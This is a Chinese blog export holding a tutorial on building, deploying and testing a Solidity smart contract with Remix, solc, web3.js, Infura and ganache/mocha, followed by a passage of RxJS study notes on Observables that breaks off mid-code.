variable,还是storage variable: public variable 中的 public 和传统面向对象语言中的 public 作用完全相同，运行运行时任何代码读取它 storage variable 中的 public 暗示着 Solidity 编译器智能合约生成 ABI 的时候自动为合约生成同名的 getter函数 Car 合约中除了 brand 变量，其他变量比如 initialBrand/newBrand 都属于临时变量、本地变量，声明周期仅限于合约函数被调用时 Car合约中没有任何复杂的逻辑控制结构比如条件、循环，典型的函数声明格式如下： 123456function getBrand() public view returns (string)&#123; return brand;&#125;# getBrand 函数名称# public view 函数类型# returns (string) 返回类型 其中典型的函数类型有以下几种： public,任何人都可以调用该函数，包括智能合约内部，或者外部账户、其他合约账户的调用 private，只有合约内部可以调用的函数 view，能够返回数据，并且不修改合约数据存储状态的函数 constant,和view的含义完全相同，不修改合约数据的函数 pure,纯粹的计算函数，和编程语言里面的 Pure Function含义完全相同，具体到智能合约领域，就是既不会读取，也不会修改合约数据 payable,标记付款类函数，调用该函数的用户在完成交易时会支付实际的资金 合约部署后，最下面能看到新的合约账户，账户下面有按钮，每个按钮代表可以调用合约函数，如getBrand，如果按钮旁边有输入框，表示调用该函数的时候需要输入参数，如setBrand。我们直接点击brand或者getBrand按钮，会看到按钮右边立即显示了部署合约时设定的参数，点击了setBrand，没有输入内容则置空。这也是Remix的一个坑：不做参数校验。 我们合约没有声明brand方法，但部署后的合约里面有，这就是Solidity为公共访问的存储变量生成的getter方法，实际上源码的getBrand方法可以直接删除 部署智能合约时发生了什么？合约部署Create和合约实例Contract Instance有几个问题需要理解： 智能合约部署的时候发生了什么，发送了什么？ 部署合约用的是哪个账户，消耗的汽油哪里来的？ 合约账户的形式是怎么样的，和普通用户的区别? 新创建合约实例3个方法对应的按钮，为什么set是红色，get和brand是不同颜色，有无区别，对后续DApp有什么影响？ Metamask账户重置的时候以太坊单笔交易确认时间平均要15s左右，为什么Remix测试的时候那么快？ 如果合约源代码修改了，能否直接在旧的合约实例上测试，如果不能是为什么，要测试新合约需要怎么做？ 合约编译的时候虽然没有报红色的错误，但是报了Waning是什么？ 合约部署的本质合约部署实际上是发起了一笔交易，交易的接受者为空，以太坊将接受者为空的交易默认认为是合约创建请求，这类交易中会修改当前部署合约的机器码ByteCode，部署成功的话会返回新建的合约账户，合约部署本身需要消耗Gas，这个费用是发起者支付的。合约部署的交易细节在Remix上通过调试日志可以看到，打开Remix调试日志区域，通过点击合约创建右上角的Details按钮可以看到 1234567891011121314151617[vm]from: 0x5B3...eddC4to: Car.(constructor)value: 0 weidata: 0x608...00000logs: 0hash: 0x975...9483bstatus true Transaction mined and execution succeedtransaction hash 0x975cea2d7f3173162027050..2489e7e419483bfrom 0x5B38Da...3FcB875f56beddC4to Car.(constructor)gas 80000000 gastransaction cost 263067 gas execution cost 263067 gas hash 0x975cea2d7f3...a52489e7e419483binput 0x608...00000decoded input &#123; "string initialBrand": "A"&#125;decoded output - logs []val 0 wei input是智能合约字节码bytecode 跟在car.json 里面的 data bytecode object一样 汽油哪里来的？部署交易中的form字段跟JavaScript VM下出现的Account列表中的第一个账户完全相同，部署完之后选中的账户余额互少一点，少掉的这部分就是使用该账户部署智能合约时消耗的汽油 合约账户的本质合约部署的直观结果是我们得到一个账户，但是我们仅仅有这个账户的地址，而没有账户的公钥、私钥、这就是合约的定义，contract instance is an account controlled by code 的准确含义，后续和合约的交互也只能通过代码，即智能合约的函数调用。 Remix带来的幻觉因为在测试时以太坊网络运行在内存中，并且是单节点，速度自然很快，但是缺陷是每次页面加载，这个测试网络中的合约实例、合约中的数据都会丢失，网络中的账户及余额也会重建 然后实际的以太坊网络，不论是测试网络还是主网，都不会那么快，在分布式网络上达成共识是个很复杂的过程，由于是对于使用POW共识算法的以太坊来说 如何重新发布？如果智能合约的源代码被修改，同样需要部署智能合约的示例，并测试这个全新的合约实例。与前端页面开发不同是，浏览器刷新后，老的页面样式、DOM接口、应用状态都被销毁了，而以太坊老的合约实例是不会被销毁 的，即使部署了新的版本，如果愿意也可以和老版本继续交互。 Solidity其实和JS区别很大Car合约自动生成的brand函数可能会消耗无限的汽油，这是在智能合约设计时需要避免的，因为智能合约中的任何代码都是需要消耗汽油的，如果不加限制，很容易出现汽油不够而操作被回滚、调用失败的情况。具体到例子：brand属性为字符串，在静态类型语言中字符串本质是动态长度的字节数组dynamically-sized byte array，也就是说我们的brand属性可能是非常长的字符数组，如果长度超过某个临界值，就会消耗超出预期的汽油，只需要把brand类型从string设置byte32即可： 1234567891011121314151617pragma solidity ^0.4.17;contract Car &#123; bytes32 public brand; function Car(bytes32 initialBrand) public &#123; brand = initialBrand; &#125; function setBrand(bytes32 newBrand) public &#123; brand = newBrand; &#125; function getBrand() public view returns (bytes32) &#123; return brand; &#125;&#125; 调用智能合约时发生了什么？setBrand被标记为红色，调用它实际发起的是transaction,任何交易都是异步的。getBrand被标记为蓝色，调用它就是简单的函数调用 call 智能合约中的函数要么是transaction类型，要么是call类型，两种类型函数的本质都是接口请求，但是又存在很大的区别，对比如下表： 函数类型 call纯粹函数调用 transaction通过交易调用 是否能修改合约数据 不能修改 可以修改 是否能返回数据 能返回数据 只能返回交易地址 TxHash 调用耗时长短 通常比较短 通常需要15s 是否需要花钱 免费调用 要花钱 对于前端工程师，如果用同步、异步函数来类比则很好理解 合约中的纯粹函数调用相当于同步的，而通过交易去调用的函数相当于异步的 通常我们不指望异步函数马上返回结果，除非给他传入了回调，也就预示着智能合约中会修改合约数据的函数即使声明了返回值，也是无效，让人不解的是Rexmix不会因为这个报错，因为调用的时候只会返回交易哈希 自建智能合约工作流的动机和目标Remix的局限性 源代码没有版本控制，不存在编写一次就不用修改的代码，没有版本控制 智能合约只能在浏览器中运行，不能方便把合约部署到以太坊的主网或者测试网络 智能合约的测试都是手动的，手动的过程是不可靠的，如果有自动化的智能合约测试是最好的 Truffle的困扰Truffles对自己的定位是以太坊开发的瑞士军刀，就好比前端领域的各种全家桶种子项目create-app,vue-cli等，帮你把各种关键模块react/webpack/vue/eslint组装好，只需要在上面开发应用逻辑即可，但对于刚入门区块链和以太坊的人来说，接触到的新概念、术语会比较多，不利于入门 工作流目标在Node开发环境使用几个最少的必要工具实现自己的智能合约编译、部署、测试工作流，整个工作流过程可以用下图： solc工具把Solidity源代码编译成 Bytecode 和 ABI 把编译后的Bytecode 部署到本地测试网络ganache-cli，公共测试网络rinkeby，使用到web3.js 单元测试中和部署完的智能合约实例交互，需要组合使用web3.js和mochajs 其中ganache-cli是Truffle框架的一部分，能够让开发者快速启动本地测试网络，不需要在本地运行以太坊节点，web3.js在合约智能部署和自动化测试时会被大量使用，这也为后面开发DApp打下良好的基础。 做完上面的事情后，重新Remix，看看我们如何在Remix中加载和测试使用脚本部署的智能合约实例 编写智能合约编译脚本compilescripts/compile.js 123456789const fs = require('fs');const path = require('path');const solc = require('solc');const contractPath = path.resolve(__dirname, '../contracts', 'Car.sol');const contractSource = fs.readFileSync(contractPath, 'utf8');const result = solc.compile(contractSource, 1);console.log(result); 运行Car.sol后得出下面的输出： 123456789101112131415161718&#123; contracts: &#123; ':Car': &#123; assembly: [Object], bytecode: '608060405234801...9d141bb3ee7074732b6b527fab31620b877c32f60029', functionHashes: [Object], gasEstimates: [Object], interface: '[&#123;"constant":true,"inputs":[],"name":"brand","outputs":[&#123;"name":"","type":"string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"newBrand","type":"string"&#125;],"name":"setBrand","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;,&#123;"inputs":[&#123;"name":"initialBrand","type":"string"&#125;],"payable":false,"stateMutability":"nonpayable","type":"constructor"&#125;]', metadata: '&#123;"compiler":&#123;"version":"0.4.26+commit.4563c3fc"&#125;,"language":"Solidity","output":&#123;"abi":[&#123;"constant":true,"inputs":[],"name":"brand","outputs":[&#123;"name":"","type":"string"&#125;],"payable":false,"stateMutability":"view","type":"function"&#125;,&#123;"constant":false,"inputs":[&#123;"name":"newBrand","type":"string"&#125;],"name":"setBrand","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"&#125;,&#123;"inputs":[&#123;"name":"initialBrand","type":"string"&#125;],"payable":false,"stateMutability":"nonpayable","type":"constructor"&#125;],"devdoc":&#123;"methods":&#123;&#125;&#125;,"userdoc":&#123;"methods":&#123;&#125;&#125;&#125;,"settings":&#123;"compilationTarget":&#123;"":"Car"&#125;,"evmVersion":"byzantium","libraries":&#123;&#125;,"optimizer":&#123;"enabled":true,"runs":200&#125;,"remappings":[]&#125;,"sources":&#123;"":&#123;"keccak256":"0x5cdc15332a2851cff3a4fb683f4779500af8a4e4c3f2456332d5643de8e9856b","urls":["bzzr://9e12529e71042b5ee545da27cab03c65921f2d4b69190f3e394589f32445913a"]&#125;&#125;,"version":1&#125;', opcodes: 'PUSH1 0x80 PUSH1 ...527FAB31620B877C32F6 STOP 0x29 ', runtimeBytecode: '608060405260043610...7074732b6b527fab31620b877c32f60029', srcmap: '28:215:0:-;;;76:79;8:9:-...-;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;', srcmapRuntime: '28:215:0:-;;;;;;...::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;:::o' &#125; &#125;, sourceList: [ '' ], sources: &#123; '': &#123; AST: [Object] &#125; &#125;&#125; contracts属性包含了所有找到的合约，源代码中只有Car合约，每个合约下面都包括了assembly、bytecode、interface、metadata、opcodes等字段，目前阶段仅需要关心的字段有： bytecode，部署合约到以太坊测试网络需要使用 interface,ABI,使用web3初始化智能合约交互实例的时候需要使用 interface 1234567891011121314151617181920212223242526[ &#123; "constant": true, "inputs": [], "name": "brand", "outputs": [ &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "newBrand", "type": "string" &#125; ], "name": "setBrand", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;, &#123; "inputs": [ &#123; "name": "initialBrand", "type": "string" &#125; ], "payable": false, "stateMutability": "nonpayable", "type": "constructor" &#125;] 可以看到是内含三个元素的大数组： 每个元素要么是合约构造函数，要么是可以调用的合约接口 每个元素里面有注明函数的类型、接收的参数类型、返回值的类型 保存编译结果使用 fs-extra,可以方便后续的部署和测试过程直接使用编译结果，需要把编译结果保存在文件系统中： 12345678910111213141516const fs = require('fs-extra');const path = require('path');const solc = require('solc');const contractPath = path.resolve(__dirname, '../contracts', 'Car.sol');const contractSource = fs.readFileSync(contractPath, 'utf8');const result = solc.compile(contractSource, 1);console.log(result);Object.keys(result.contracts).forEach(name =&gt; &#123; const contractName = name.replace(/^:/, ''); const filePath = path.resolve(__dirname, '../compiled', `$&#123;contractName&#125;.json`); fs.outputJsonSync(filePath, result.contracts[name]); console.log(`save compiled contract $&#123;contractName&#125; to $&#123;filePath&#125;`);&#125;) 然后重新编译脚本，确保complied目录下包含了新生成的Car.json 类似于前端构建流程中编译步骤，编译之前需要把之前的结果清空，然后把最新的编译结果保存下来，对编译脚本作如下改动： 123456789101112131415161718192021222324252627const fs = require('fs-extra');const path = require('path');const solc = require('solc');// cleanupconst compiledDir = path.resolve(__dirname, '../compiled');fs.removeSync(compiledDir);fs.ensureDirSync(compiledDir);// compileconst contractPath = path.resolve(__dirname, '../contracts', 'Car.sol');const contractSource = fs.readFileSync(contractPath, 'utf8');const result = solc.compile(contractSource, 1);// check errorsif (Array.isArray(result.errors) &amp;&amp; result.errors.length) &#123; throw new Error(result.errors[0])&#125;// save to diskObject.keys(result.contracts).forEach(name =&gt; &#123; const contractName = name.replace(/^:/, ''); const filePath = path.resolve(__dirname, '../compiled', `$&#123;contractName&#125;.json`); fs.outputJsonSync(filePath, result.contracts[name]); console.log(`save compiled contract $&#123;contractName&#125; to $&#123;filePath&#125;`);&#125;) 编写智能合约部署脚本deployweb3.js简介是把我们的前端世界和区块链世界连接起来的桥梁，web3js里面包含了多个以太坊生态中不同的模块，具体包含： web3-eth,方便js和以太坊区块链通信，部署、调用智能合约 web3-utils,为DApp开发者提供了大量的工具函数，比如单位换算等，DApp开发时会使用里面的函数 web3-shh,方便做基于whisper协议的P2P通信和广播 web3-bzz,方便做基于swarm协议的去中心化文件存储 以太坊的主网、测试网络、本地私有网络非常多，以太坊的钱包应用也非常多，web3.js没有选择兼容所有的情况，而是自己定制了一个接口规范，让社区开发者为之贡献插件，插件在web3.js体系叫做provider，可以理解为webpack生态的plugin. web3js通过插件机制和以太坊不通过网络通信的模式可以用下面的图示： 部署的必要条件客户端和以太坊网络的任何交互都可以定性为接口调用和介意，智能部署属于后者，部署时除了必须要有bytecode。发起靠谱哦的必要条件也应算在内，具体来说包含如下几个方面： 余额大于0的账户以太坊的任何交易都需要账户发起，账户中必须要有足够多的余额来支付手续费Transcation Fee，我们之前创建并充值的Metamask账户可以派上用场 与目标网络的通信区块链上的任何交易都会被发送到某个网络，并被这个网络中的节点打包确认，可以考虑把智能合约部署到Rinkeby网络中，这样我们的交易通过自己运行的节点广播给Rinkeby测试网络中的其他节点，就能被打包确认，但是实际上前端自己跑节点成本还是很高的，还在社区有人做了各种以太坊的入口节点，为广发开发者提供接口可以直接调用。 Infura就提供了这样的服务 合约部署脚本scripts/deploy.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const fs = require('fs-extra');const path = require('path');const config = require('config');const Web3 = require('web3');const HDWalletProvider = require('truffle-hdwallet-provider');// Get ByteCodeconst contractPath = path.resolve(__dirname, '../compiled/Car.json');const &#123; interface, bytecode &#125; = require(contractPath);// Configuration Providerconst provider = new HDWalletProvider( config.get('hdwallet'), config.get('infuraUrl'),)// Initial Web3 Instanceconst web3 = new Web3(provider);(async () =&gt; &#123; // Get Wallet Money const accounts = await web3.eth.getAccounts(); console.log('部署合约的账户：', accounts[0]) // Create Contract Instance And Deploy console.time('合约部署耗时') const result = await new web3.eth.Contract(JSON.parse(interface)) .deploy(&#123; data: bytecode, arguments: ['BINHONG'] &#125;) .send(&#123; from: accounts[0], gas:'1000000', gasPrice: web3.utils.toHex(web3.utils.toWei('10', 'gwei')), gasLimit: web3.utils.toHex(21000), &#125;) console.timeEnd('合约部署耗时'); const contractAddress = result.options.address; console.log('合约部署成功', contractAddress); console.log('合约查看地址', `https://rinkeby.etherscan.io/address/$&#123;contractAddress&#125;`); // Write Contract Address Into File System const addressFile = path.resolve(__dirname, '../address.json'); fs.writeFileSync(addressFile, JSON.stringify(contractAddress)); console.log('地址写入成功:', addressFile); process.exit();&#125;)() Configuration Provider 初始化了 Infura 提供的 HTTP 接口的测试网入口以及助记词钱包的provider，钱包助记词是 Metamask的钱包助记词 接着使用配置好的插件实例生成新的web3 实例 调用 web3.eth.getAccounts 方法解锁助记词钱包里面的第1个账户作为部署合约的账户，我们充值的也是Metamask钱包的第一个账户，而实际上这个助记词是可以派生出很多账户的，其他账户没有余额，也就无法使用 Create Contract Instance And Deploy 的代码也可以分开来写，链式的代码调用实际上做了合约初始化、交易初始化、交易发送3件事情： 123const contract = new web3.eth.Contract(JSON.parse(interface));const transaction = contract.deploy(&#123;data:bytecode,arguments:['BINHONG']&#125;);const result = await transaction.send(&#123;from:accounts[0],gas:100000&#125;) 使用etherscan 和 remix 查看和测试合约实例智能合约实例是存储在以太坊网络上被代码控制的账户，部署完之后，可以通过echerscan/remix去访问它、和它交互 用etherscan查看合约用什么网络就用xxtestnet.etherscan.io/tx/contractAddress,点击列表最左侧的TxHash字段，可以看到合约部署的交易细节： 用Remix测试智能合约可以使用Remix加载测试网络上特定的合约实例，并与之交互，下面是具体步骤 配置合约源码run transactions里面环境选择你的测试网络，编译原来的源码，At Address输入你的合约地址，然后进行调试，getbrand可以很快拿到值，但是setBrand却是处于pending状态，在账户那里会显示可能需要花费的汽油，确定后15s内返回结果，并消耗了汽油 1234567891011121314status true Transaction mined and execution succeedtransaction hash 0xa45...08e7eb67d003d936ad0d6591c83cffrom 0x95...14cto Car.setBrand(string) 0xc32eDBd9...C46gas 29457 gastransaction cost 29453 gas hash 0xa45e1443c2f61b3...cfinput 0xc1f...00000decoded input &#123; "string newBrand": "Test"&#125;decoded output - logs []val 0 wei 再次点击brand，就是返回刚刚输入的”Test”了 使用mocha+web3.js+ganache编写合约测试针对部署后的合约实例进行测试，而不是合约源代码，可以看为端到端测试 自动化测试可以跟测试网络上的合约实例交互，但是每次跑测试都需要花点几分钟时间，此外还要自己进行复杂的账户管理。 因为区块链网络交易确认的异步性，在工具选择时需要做些权衡，ganache-cli就像是Remix中运行在内容中的JavaScript VM测试网络，其方法调用，交易确认速度非常快，为开发者提供了成本极低的本地测试网络，很适合用来测试。 而ganache-cli为web3.js提供了兼容的provider，这样就可以通过web3.js把合约部署到ganache-cli提供的本地测试网络上，并且跟合约实例交互。 编写测试测试时我们通常会把每次测试运行的环境隔离开，对应到智能合约测试，每次测试需要部署新的合约实例，然后针对新的实例做功能测试 Car合约的功能比较简答，设计如下2个测试用例： 合约部署时传入的brand属性被正确存储 调用setBrand之后合约的brand属性被正确更新 测试代码： 1234567891011121314151617181920212223242526272829303132333435363738394041const path = require('path');const assert = require('assert');const ganache = require('ganache-cli');const Web3 = require('web3');const contractPath = path.resolve(__dirname, '../compiled/Car.json');const &#123; interface, bytecode &#125; = require(contractPath);const web3 = new Web3(ganache.provider());let accounts;let contract;const initialBrand = 'BinHong';describe('contract', () =&gt; &#123; beforeEach(() =&gt; &#123; accounts = await web3.eth.getAccounts(); console.log('合约部署账户：', accounts[0]) contract = await new web3.eth.Contract(JSON.parse(interface)) .deploy(&#123; data: bytecode, argument: [initialBrand] &#125;) .send(&#123; from: accounts[0] &#125;); console.log('合约部署成功：', contract.options.address) &#125;) it('deploy a contract', () =&gt; &#123; assert.ok(contract.options.address); &#125;) it('has initial brand', async () =&gt; &#123; const brand = await contract.methods.brand().call(); assert.equal(brand, initialBrand) &#125;) it('can change the brand', async () =&gt; &#123; const newBrand = 'LBH'; await contract.methods.setBrand(&#123; newBrand &#125;).send(&#123; form: accounts[0] &#125;) const brand = await contract.methods.brand().call(); assert.equal(brand, newBrand); &#125;)&#125;) 代码使用的断言库是nodejs内置的assert模块，ganache-cli的provider自己在内部管理了一些账户。web3.js智能合约实例交互的方法，在DApp开发时会大量使用： contract.methods.brand().call()，调用合约上的方法，通常是取数据，立即返回 contract.methods.setBrand(‘xxx’).send(),对合约发起交易，通常是修改数据，返回是交易Hash send必须指定发起的账户地址，而call可以直接调用 运行测试123456789101112131415161718$ mocha tests contract合约部署账户： 0x25E0EAE6B1A9D09Ad3B8f20E1945B6Aa03055275合约部署成功： 0xC9640efE6f4AE6561BC5CE294C814f71f465E04f ✔ deploy a contract合约部署账户： 0x25E0EAE6B1A9D09Ad3B8f20E1945B6Aa03055275合约部署成功： 0x72af628dE4b4C09D82aA66846aD3317EA6B818f4 ✔ has initial brand合约部署账户： 0x25E0EAE6B1A9D09Ad3B8f20E1945B6Aa03055275合约部署成功： 0xB572717DFc65236F6a07631A5b02a80FaAD29CB1 ✔ can change the brand (295ms) 3 passing (1s)Done in 3.47s. 完整的工作流1234567"scripts": &#123; "predeploy": "yarn compile", "pretest": "yarn compile", "compile": "node scripts/compile.js", "deploy": "node scripts/deploy.js", "test": "mocha tests/"&#125;,]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RxJS]]></title>
    <url>%2F2021-04-25-rxjs.html</url>
    <content type="text"><![CDATA[学习抄录加强记忆… RxJS入门RxJS 是一个库，通过使用 observable 序列来编写异步和基于事件的程序，提供一个核心的类型 Observable,附属类型（Observer/Schedulers/Subjects）和受[Array#extras]启发的操作符（map,filter,reduce,every等等），这些数组操作符可以把异步事件作为集合来处理。 可以把 Rxjs当做是用来处理事件的 Lodash ReactiveX 结合了观察者模式、迭代器模式和使用集合的函数式编程，以满足以一种理想方式来管理序列所需要的一切。 在 RxJS中用来解决异步事件管理的基本概念是： Observable（可观察对象）：表示一个概念，这个概念是一个可调用的未来值或事件的集合 Observer（观察者）：一个回调函数的集合，它知道如何去监听由 Observable提供的值 Subscription（订阅）：表示 Observable的执行，主要用于取消 Observable的执行。 Operators（操作符）：采用函数式编程风格的纯函数（pure function）,使用像map/filter/concat/flatMap等这样的操作符来处理集合 Subject（主体）：相当于 EventEmitter,并且是将值或事件多路推送给多个 Observer 的唯一方式 Schedulers（调度器）：用来控制并发并且是中央集权的调度员，运行我们在发生计算时进行协调，例如 setTimeout 或 requestAnimationFrame或其他。 例子注册事件监听器常规写法与 RxJS写法 12345const button = document.querySelector(&apos;button&apos;);button.addEventListener(&apos;click&apos;,()=&gt;console.log(&apos;Clicked!&apos;))// RxJSRx.Observable.fromEvent(button,&apos;click&apos;).subscribe(()=&gt;console.log(&apos;Clicked!&apos;)) 纯净性（Purity）RxJS 强大的正是它使用纯函数来产生值的能力，这意味这代码不容易出错。 通常会创建一个非纯函数，在这个函数之外也使用了共享变量的代码，使得应用状态一团糟 12345let count = 0;button.addEventListener(&apos;click&apos;,()=&gt;console.log(`Clicked $&#123;++count&#125; times`))// RxJSRx.Observable.fromEvent(button,&apos;click&apos;).scan(count=&gt;count+1,0).subscribe(count=&gt;console.log(`Clicked $&#123;count&#125; times`)) scan操作符的工作原理与数组的 reduce类似，它需要一个暴露给回调函数当参数的初始值，每次回调函数运行后的返回值会作为下次回调函数运行时的参数。 流动性（Flow）RxJS 提供一整套操作符来帮助控制事件如何流经 observables. 下面的代码展示的是如何控制一秒钟内最多点击一次： 123456789101112const count = 0;const rate = 1000;const lastClick = Date.now() - rate;const button = document.querySelector(&apos;button&apos;);button.addEventListener(&apos;click&apos;,()=&gt;&#123; if(Date.now() - lastClick &gt;= rate)&#123; console.log(`Clicked $&#123;++count&#125; times`) lastClick = Date.now(); &#125;&#125;)// RxJSRx.Observable.fromEvent(button,&apos;click&apos;).throttleTime(1000).scan(count=&gt;count+1,0).subscribe(count=&gt;console.log(`Clicked $&#123;count&#125; times`)) 值（Values）对于流经 observables 的值，可以对其进行转换 下面代码展示的是如何累加每次点击的鼠标x坐标 12345678button.addEventListener(&apos;click&apos;,(event)=&gt;&#123; if(Date.now() - lastClick &gt;= rate)&#123; count += event.clientX; lastClick = Date.now(); &#125;&#125;)// RxJSRx.Observable.FromEvent(button,&apos;click&apos;).throttleTime(1000).map(event=&gt;event.clickX).scan((count,clientX)=&gt;count+clientX,0).subscribe(count=&gt;console.log(count)); Observable（可观察对象）Observable 是多个值的惰性推送集合，填补了下面表格的空白： 单个值 多个值 拉取 Function Iterator 推送 Promise Observable 实例：当订阅下面代码中的 Observable的时候会立即（同步地）推送值1，2，3，然后1秒后会推送值4，再然后是完成流： 12345678910111213141516171819202122const &#123; Observable &#125; = require(&apos;rxjs&apos;);const observable = new Observable(obeserver =&gt; &#123; obeserver.next(1); obeserver.next(2); obeserver.next(3); setTimeout(() =&gt; &#123; obeserver.next(4); obeserver.complete(); &#125;, 1000)&#125;)// 要调用 Observable 并看到这些值，我们需要订阅 Observableconsole.log(&apos;just before subscribe&apos;);observable.subscribe(&#123; next: x =&gt; console.log(`got value $&#123;x&#125;`), error: err =&gt; console.error(`something wrong occurred: $&#123;err&#125;`), complete: () =&gt; console.log(&apos;done&apos;)&#125;)console.log(&apos;just after subscribe&apos;) 拉取（Pull）vs. 推送（Push）拉取和推送是两种不同的协议，用来描述数据生产者（Producer）如何与数据消费者（Consumer）进行通信的。 拉取-在拉取体系中，由消费者来决定何时从生产者那里接收数据。生产者本身不知道数据是何时交付到消费者手中的。 每个JS函数都是拉取体系，函数是数据的生产者，调用该函数的代码通过从函数调用中取出一个单个返回值来对该函数进行消费。 ES2015引入了 generator 函数和 iterators(function*) 这是另外一种类型的拉取体系。调用 iterator.next() 的代码是消费者，它会从 iterator(生产者)取出多个值 生产者 消费者 拉取 被动的：当被请求时产生数据 主动的：决定何时请求数据 推送 主动的：按自己的节奏产生数据 被动的：对收到的数据做出反应 推送-在推送体系中，由生产者来决定何时把数据发送给消费者，消费者本身不知道何时会接受到数据 Promise是最常见的推送体系类型。由Promise(生产者)将一个解析过的值传递给已注册的回调函数（消费者），但不同于函数的是，由Promise来决定何时把值推送给回调函数。 RxJS引入了 Observables 一个新的推送体系。Observable 是多个值的生存者，并将值推送给观察者（消费者）。 Function 是惰性的评估运算，调用时会同步地返回一个单一值 Generator 是惰性的评估运算，调用时会同步地返回零到（有可能的）无限多个值 Promise 是最终可能（或可能不）返回单个值的运算 Observable 是惰性的评估运算，它可以从它被调用的时刻起同步或异步地返回零到（有可能的）无限多个值 Observable作为函数的泛化与流行的说法相反，Observable 既不像 EventEmitters，也不像多个值的Promises，在某些情况下，即当使用RxJS的Subjects进行多播时，Observables的行为可能会比较像EventEmitters，但通常情况下Observables的行为并不像EventEmitters. Observables 像是没有参数，但可以泛化为多个值的函数 12345678910111213141516171819202122function foo()&#123; console.log(&apos;Hello&apos;); return 42;&#125;const x = foo.call(); // 相当于 foo()console.log(x)const y = foo.call(); // 等同于 foo()console.log(y)// 输出 &quot;Hello&quot; 42 &quot;Hello&quot; 42// Observablesconst &#123; Observable &#125; = require(&apos;rxjs&apos;);const foo = new Observable(observer =&gt; &#123; console.log(&apos;Hello&apos;); observer.next(42)&#125;)foo.subscribe(x =&gt; console.log(x))foo.subscribe(y =&gt; console.log(y)) 因为函数和 Observables 都是惰性运算，如果不调用函数，不会执行console.log(&#39;Hello&#39;)。Observable 也是如此，不调用（使用 subscribe）,console.log(&#39;Hello&#39;)也不会执行。此外，调用或订阅是独立的操作；两个函数调用会触发两个单独的副作用，两个Observable订阅同样也是触发两个单独的副作用。EventEmitters共享副作用并且无论是否存在订阅者都会尽早执行，Observables与之相反，不会共享副作用并且是延迟执行。 订阅 Observable 类似于调用函数 一些人声称Observables是异步的，那不是真的： 12345678910console.log(&apos;before&apos;);foo.subscribe(x=&gt;console.log(x))console.log(&apos;after&apos;);/**beforeHello42after*/// 这说明了foo订阅是完全同步的，就像函数一样 那么 Observable 和函数的区别是什么？Observable可以随着时间的推移返回多个值，这是函数所做不到的 12345function foo()&#123; console.log(&apos;Hello&apos;); return 45; return 100; // 死代码，不会执行&#125; 函数只能返回一个值，但 Observables 可以这样： 123456789101112131415161718const foo = new Observable(observer =&gt; &#123; console.log(&apos;Hello&apos;); observer.next(42); observer.next(100); observer.next(200);&#125;)console.log(&apos;before&apos;)foo.subscribe(x =&gt; console.log(x))console.log(&apos;after&apos;)/**beforeHello42100200after*/ 也可以异步地返回值 12345678910111213141516171819202122const foo = new Observable(observer =&gt; &#123; console.log(&apos;Hello&apos;); observer.next(42); observer.next(100); observer.next(200); setTimeout(() =&gt; &#123; observer.next(300); &#125;, 1000)&#125;)console.log(&apos;before&apos;)foo.subscribe(x =&gt; console.log(x))console.log(&apos;after&apos;)/**beforeHello42100200after300*/ 结论： func.call() 意思是同步地给一个值 observable.subscribe() 意思是给我任意数量的值，无论是同步还是异步的 Observable剖析Observables使用观察者来订阅，然后执行并发送 next/error/complete给观察者，而且执行可能会被清理。这四个方面全部编码在Observables实例中，但某些方面是与其他类型相关的，像 Observer观察者和Subscription订阅 Observable的核心关注点： 创建 Observables 订阅 Observables 执行 Observables 清理 Observables 创建123const observable = new Observable(observer =&gt; &#123; const id = setInterval(() =&gt; observer.next(&apos;hi&apos;), 1000)&#125;) 订阅12345const observable = new Observable(observer =&gt; &#123; const id = setInterval(() =&gt; observer.next(&apos;hi&apos;), 1000)&#125;)observable.subscribe(x =&gt; console.log(x)) subscribe调用在同一 Observable 的多个观察者之间是不共享的，当使用一个观察者调用 observable.subscribe时，new Observable(subscrive)中的 subscribe函数只服务给定的观察者，对于observable.subscribe的每次调用都会触发针对给定观察者的独立设置 订阅 Observable 像是调用函数，并提供接收数据的回调函数 这与像 addEventListener/removeEventListener 这样的事件处理方法API是完全不同的。使用 observable.subscribe 在 Observable中不会将给定的 观察者注册为监听器。Observable甚至不会去维护一个附加的观察者列表 subscribe 调用是启用Observable执行的一种简单方式，并将值或事件传递给本次执行的观察者 执行Observable 是惰性运算，只有在每个观察者订阅后才会执行，随着时间的推移，执行会以同步或异步的方式产生值 Observable执行可以传递三种类型的值： Next通知：发送一个值，比如数字、字符串、对象等等 Error通知：发送一个JS错误或异常 Complete通知：不再发送任何值 Next通知是最重要，也是最常见的类型，它们表示传递给观察者的实际数据，Error和Complete通知只会在Observable执行期间发生一次，并且只会执行其中的一个 这些约束用所谓的 Observable语法或合约表达最好，写为正则是这样的： 1next*(error|complete)? 三个next然后是complete 1234567const observable = new Observable(observer =&gt; &#123; observer.next(1); observer.next(2); observer.next(3); observer.complete();&#125;)// Observable严格遵守自身的规约，complete之后不会再发送 try/catch可以捕获异常 12345678910const observable = new Observable(observer =&gt; &#123; try &#123; observer.next(1); observer.next(2); observer.next(3); observer.complete(); &#125; catch (err) &#123; observer.error(err) &#125;&#125;) 清理因为Observable执行可能是无限的，并且观察者通常希望能在有限的时间内中止执行，所以我们需要一个API来取消执行，因为每个执行都是其对应观察者专属的，一旦观察者完成接收值，它必须要一种方法来停止执行，以避免浪费计算能力和内存资源。 当调用了 observable.subcribe 观察者会被附加到新创建的 Observable 执行中，这个调用还返回了一个对象，即 Subscription(订阅)： 1const subscription = observable.subscribe(x=&gt;console.log(x)) Subscription表示进行中的执行，有最小化的API以允许你取消执行 12345const &#123; from &#125; = require(&apos;rxjs&apos;);const observable = from([10,20,30])const subscription = observable.subscribe(x=&gt;console.log(x));subscription.unsubscribe(); 当订阅了 Observable会得到一个 Subscription，它表示进行中的执行，只要调用 unsubscribe方法就可以取消执行 Observable可以通过返回一个自定义 unsubscribe函数 12345678910111213const observable = new Observable(observer =&gt; &#123; const intervalID = setInterval(() =&gt; &#123; 